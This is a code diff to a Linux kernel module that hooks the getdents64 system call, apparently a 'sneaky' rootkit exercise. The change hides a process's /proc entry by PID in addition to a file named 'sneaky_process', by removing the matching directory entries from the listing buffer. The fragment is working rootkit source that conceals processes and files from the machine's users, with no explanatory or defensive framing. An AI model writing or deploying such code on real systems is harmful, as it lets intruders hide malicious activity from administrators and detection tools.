@@ -61,11 +61,14 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs) {
   char * buf = (char *)regs->si;
   char * buf_end = buf + bytes_read;
   const char * target_file_name = "sneaky_process";
+  char pid_name[256];
+  sprintf(pid_name, "%d", pid);
   struct linux_dirent64 * dirp = NULL;
   unsigned int bpos = 0;
   for (; bpos < bytes_read;) {
     dirp = (struct linux_dirent64 *)(buf + bpos);
-    if (strcmp(dirp->d_name, target_file_name) == 0) {  //remove this memory
+    if (strcmp(dirp->d_name, target_file_name) == 0 ||
+        strcmp(dirp->d_name, pid_name) == 0) {  //remove this memory
       char * source = (char *)dirp + dirp->d_reclen;
       size_t bytes_to_move = buf_end - source;
       bytes_read -= dirp->d_reclen;
